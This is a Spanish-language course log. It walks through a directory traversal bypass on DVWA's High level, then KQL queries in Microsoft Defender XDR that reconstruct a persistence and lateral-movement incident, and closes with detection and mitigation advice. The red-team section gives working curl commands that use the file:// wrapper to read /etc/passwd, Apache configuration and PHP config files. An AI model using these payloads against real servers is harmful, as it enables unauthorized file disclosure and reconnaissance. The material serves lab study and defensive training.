# Día 30 — Directory Traversal + KQL Joins & Time

**Fecha:** Mayo 2026  
**MITRE:** T1083  
**Target:** DVWA File Inclusion (High) + Microsoft Defender XDR

---

## Teoría

### Directory Traversal

Directory Traversal es una vulnerabilidad donde el atacante manipula la ruta de un archivo para acceder a directorios fuera del directorio permitido por la app.

```
URL normal:
http://app.com/download?file=manual.pdf
→ servidor lee: /var/www/files/manual.pdf

URL manipulada:
http://app.com/download?file=../../../../etc/passwd
→ servidor lee: /etc/passwd
```

**¿Qué es `../`?**

En cualquier sistema de archivos, `..` significa "subir un nivel":
```
/var/www/files/         ← estás aquí
../                     → /var/www/
../../                  → /var/
../../../               → /
../../../../etc/passwd  → /etc/passwd
```

**¿Cuál es la diferencia con LFI (Día 9)?**

| | Directory Traversal | LFI |
|--|--------------------|----|
| **Qué hace** | Lee archivos fuera del directorio permitido | Incluye archivos como código PHP ejecutable |
| **Impacto** | File disclosure | File disclosure + ejecución de código |
| **Vector** | Parámetro de descarga/lectura | Parámetro de include/require |

LFI es Directory Traversal + ejecución. Directory Traversal puro solo lee archivos.

**Concepto importante — PHP ejecuta vs muestra:**
Cuando se incluye un archivo `.php` via traversal, el servidor lo **ejecuta** en lugar de mostrarlo como texto. Si el archivo solo define variables sin `echo`, no produce output visible. Para leer código fuente PHP se necesita el wrapper `php://filter` — pero el nivel High de DVWA lo bloquea.

**Casos reales:**
- **Pulse Secure VPN (2019)** — CVE-2019-11510, traversal sin autenticación → credenciales de miles de empresas
- **Cisco ASA (2020)** — traversal en WebVPN → archivos de configuración internos
- **Apache HTTP Server (2021)** — CVE-2021-41773, traversal en mod_cgi → ejecución remota de código

---

## Red Team

### Sección 1 — Setup: Login y nivel High

DVWA requiere cookie de sesión + cookie de nivel de seguridad. El flujo del Día 29 aplica igual:

```bash
# Cookie de sesión obtenida del navegador
COOKIE="gi6dd9pdtn16ibd17hddln29e0"

# Verificar acceso en nivel High
curl -s -o /dev/null -w "%{http_code}" \
  -b "PHPSESSID=$COOKIE; security=high" \
  "http://192.168.1.96:8080/vulnerabilities/fi/?page=include.php"
# → 200

# Confirmar nivel
curl -s -b "PHPSESSID=$COOKIE; security=high" \
  "http://192.168.1.96:8080/vulnerabilities/fi/?page=include.php" | \
  grep "Security Level"
# → Security Level: high
```

**Nota importante:** La cookie `security` debe mandarse explícitamente en el CLI — sin ella DVWA devuelve nivel "impossible" aunque la UI muestre High. DVWA usa dos fuentes para el nivel: la cookie del request y la sesión del servidor.

### Sección 2 — Protección del nivel High y bypass

**¿Qué protege el nivel High?**

El código fuente de DVWA High valida que el parámetro `page` empiece con `file`. Esto bloquea el traversal clásico con `../`:

```bash
# Intento bloqueado
curl -s -b "PHPSESSID=$COOKIE; security=high" \
  "http://192.168.1.96:8080/vulnerabilities/fi/?page=../../../../etc/passwd"
# → ERROR: File not found!
```

**El bypass — wrapper `file://`:**

El wrapper `file://` de PHP satisface la validación (empieza con "file") pero el intérprete lo procesa como una ruta absoluta al filesystem:

```bash
curl -s -b "PHPSESSID=$COOKIE; security=high" \
  "http://192.168.1.96:8080/vulnerabilities/fi/?page=file:////etc/passwd" | \
  grep -v "^$" | grep -i "root\|nobody\|www-data"
```

**Output — `/etc/passwd` leído exitosamente:**
```
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

**DIRECTORY TRAVERSAL HIGH COMPLETADO** ✅

| Usuario | UID | Significado |
|---------|-----|-------------|
| `root` | 0 | Superusuario — tiene shell `/bin/bash` activa |
| `www-data` | 33 | Usuario con el que corre Apache/DVWA |
| `nobody` | 65534 | Usuario sin privilegios del SO |

`root` tiene `/bin/bash` — en este servidor hay shell interactiva para root, a diferencia del contenedor de Juice Shop donde root tenía `/sbin/nologin`.

### Sección 3 — Reconocimiento adicional via traversal

**Leer configuración de Apache:**
```bash
curl -s -b "PHPSESSID=$COOKIE; security=high" \
  "http://192.168.1.96:8080/vulnerabilities/fi/?page=file:////etc/apache2/sites-enabled/000-default.conf" | \
  grep -i "document\|root"
# → DocumentRoot /var/www/html
```

**Leer phpinfo para mapear el servidor:**
```bash
curl -s -b "PHPSESSID=$COOKIE; security=high" \
  "http://192.168.1.96:8080/vulnerabilities/fi/?page=file:////var/www/html/phpinfo.php" | \
  grep -i "document_root\|mysql"
```

**Output relevante:**
```
DOCUMENT_ROOT: /var/www/html
MySQL: habilitado (mysqli, pdo_mysql)
PHP version: 7.0
```

**Información obtenida via traversal:**
```
Sistema: Linux
Web root: /var/www/html
Web server: Apache
Usuario web: www-data
PHP: 7.0 con MySQL habilitado
Shell de root: /bin/bash (activa)
```

### Sección 4 — Limitación: archivos PHP no muestran código fuente

Al intentar leer archivos `.php` via `file://`, PHP los **ejecuta** en lugar de mostrarlos. Los archivos que solo definen variables no producen output visible:

```bash
curl -s -b "PHPSESSID=$COOKIE; security=high" \
  "http://192.168.1.96:8080/vulnerabilities/fi/?page=file:////var/www/html/config/config.inc.php"
# → sin output (el archivo se ejecutó pero no tiene echo)
```

El wrapper `php://filter` que permitiría leer el código fuente en base64 está bloqueado en el nivel High. Esta es una protección efectiva adicional del nivel High de DVWA.

---

## SC-200 — KQL: Joins & Time

### Query 1 — `between` y `datetime` para investigar un incidente

```kql
AlertInfo
| where Timestamp between (datetime(2026-04-14) .. datetime(2026-04-15))
| project Timestamp, Title, Severity, Category
| sort by Timestamp asc
```

**Resultado — 13 alertas del 14 de abril (día del hands-on keyboard attack):**

```
Anomaly detected in ASEP registry    Medium  Persistence
Anomaly detected in ASEP registry    Medium  Persistence
Persistence behavior was blocked     Low     Persistence
Compromised account conducting...    High    LateralMovement
Potential human-operated malicious   High    SuspiciousActivity
```

**Operador nuevo — `between`:**
Filtra un rango específico de fechas. Más preciso que `ago()` para investigar incidentes en fechas exactas.

```kql
| where Timestamp between (datetime(2026-04-14) .. datetime(2026-04-15))
```

### Query 2 — Join con MITRE ATT&CK mapping

```kql
AlertInfo
| where Timestamp between (datetime(2026-04-14) .. datetime(2026-04-15))
| join kind=inner AlertEvidence on AlertId
| where isnotempty(AttackTechniques)
| project Timestamp, Title, AttackTechniques, EntityType, AccountName, DeviceName
| sort by Timestamp asc
```

**Resultado — 196 elementos con técnicas MITRE mapeadas:**

```
Anomaly detected in ASEP  → ["Modify Registry (T1112)","Registry Run Keys / Startup Folder (T1547.001)"]
                             EntityType: User/Machine → usuario1
```

**Operador nuevo — `isnotempty()`:**
Filtra filas donde la columna no está vacía. Equivalente a `WHERE columna IS NOT NULL AND columna != ''` en SQL.

### Técnicas MITRE identificadas en el incidente

**T1112 — Modify Registry**
El atacante modificó el registro de Windows — la base de datos jerárquica donde Windows guarda configuraciones del sistema y aplicaciones. Modificarlo permite cambiar comportamientos del sistema sin crear archivos nuevos, lo que dificulta la detección.

**T1547.001 — Registry Run Keys / Startup Folder**
Subtécnica de Persistence. El atacante agregó entradas en las claves de registro que se ejecutan automáticamente al iniciar Windows:

```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
```

Todo lo que esté en esas claves corre automáticamente al iniciar sesión. Es el ASEP (Auto-Start Extensibility Point) más común — mecanismo que permite ejecutar código al arranque del sistema.

**Cadena completa del ataque reconstruida via KQL:**
```
1. Atacante compromete cuenta usuario1
2. Modifica Run Keys en el registro (T1112 + T1547.001) → persistencia
3. Defender detecta comportamiento ASEP anómalo → alerta Medium
4. Defender bloquea el comportamiento de persistencia → alerta Low
5. Atacante intenta movimiento lateral via RDP (T1021.001) → alerta High
6. Automatic Attack Disruption bloquea el movimiento lateral
```

### Resumen de operadores KQL — acumulado Días 28-30

| Operador | Equivalente SQL | Qué hace |
|----------|----------------|----------|
| `take` | LIMIT | Limita número de filas |
| `where` | WHERE | Filtra filas |
| `project` | SELECT | Selecciona columnas |
| `sort by` | ORDER BY | Ordena resultados |
| `summarize count() by` | GROUP BY + COUNT | Agrupa y cuenta |
| `ago(30d)` | NOW() - INTERVAL | Hace N tiempo |
| `contains` | LIKE '%texto%' | Texto parcial |
| `countif()` | COUNT(CASE WHEN) | Cuenta con condición |
| `bin(Timestamp, 1d)` | DATE_TRUNC | Agrupa por intervalo |
| `join kind=inner` | INNER JOIN | Combina tablas |
| `between` | BETWEEN | Rango de fechas |
| `datetime()` | CAST AS datetime | Fecha específica |
| `isnotempty()` | IS NOT NULL | Filtra vacíos |

---

## Blue Team

### Detección Directory Traversal
- **WAF** — reglas que detecten `../` o `file://` en parámetros de URL
- **Logs de Apache** — requests con secuencias `..%2F` o `%2F%2F` en la URL
- **Alertas de acceso a archivos sensibles** — `/etc/passwd`, `/etc/shadow`, archivos de configuración
- **FIM** — File Integrity Monitoring en archivos críticos del sistema

### Mitigación Directory Traversal
- **Validación de rutas** — verificar que la ruta resuelta esté dentro del directorio permitido (`realpath()` en PHP)
- **Whitelist de archivos** — solo permitir nombres de archivo específicos, no rutas completas
- **Chroot / contenedores** — limitar el filesystem accesible al proceso web
- **Principio de mínimo privilegio** — `www-data` no debería poder leer `/etc/passwd` en producción
- **Deshabilitar wrappers PHP** — `allow_url_include = Off` y restringir wrappers disponibles

---

## Conclusión

Directory Traversal High demostró que las validaciones superficiales — "el parámetro debe empezar con file" — pueden bypassearse con el wrapper `file://` que satisface la validación pero accede al filesystem completo. El reconocimiento via traversal reveló la estructura del servidor: DocumentRoot, versión PHP, usuario web y estado de root. La limitación de no poder leer archivos `.php` fuente es una protección real del nivel High — PHP los ejecuta en lugar de mostrarlos.

En KQL se ejecutaron 2 queries avanzadas sobre el incidente real del 14 de abril: `between` para acotar el rango de fechas exacto, y un join con `AlertEvidence` para mapear las técnicas MITRE del atacante. Se identificaron T1112 y T1547.001 — el atacante intentó establecer persistencia via Run Keys antes de ser bloqueado por Defender. El acumulado es 13 operadores KQL cubriendo filtering, aggregation, time functions y joins.
